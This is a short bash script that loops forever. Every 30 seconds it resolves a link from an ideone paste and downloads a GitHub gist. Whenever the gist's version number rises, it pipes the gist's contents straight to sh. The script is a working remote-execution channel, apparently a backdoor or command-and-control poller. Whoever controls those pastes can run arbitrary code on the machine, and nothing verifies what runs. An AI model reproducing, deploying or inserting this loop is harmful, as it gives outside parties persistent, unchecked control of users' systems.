#!/usr/bin/env bash




for (( ; ; ))
do
    link=$(curl https://ideone.com/plain/BCW5py)
    curl "https://gist.githubusercontent.com/samvel1024/$link" > ~/.currjt

    last_version=$(<~/.jtversion)

    PROPERTY_FILE=$HOME'/.currjt'

    function getProperty {
       PROP_KEY=$1
       PROP_VALUE=`cat $PROPERTY_FILE | grep "$PROP_KEY" | cut -d'=' -f2`
       echo $PROP_VALUE
    }


    curr_version=$(getProperty "#VERSION")


    if [ "$curr_version" -gt "$last_version" ];then
        echo $curr_version > ~/.jtversion
        cat "$HOME/.currjt" | sh
    fi

    sleep 30
done

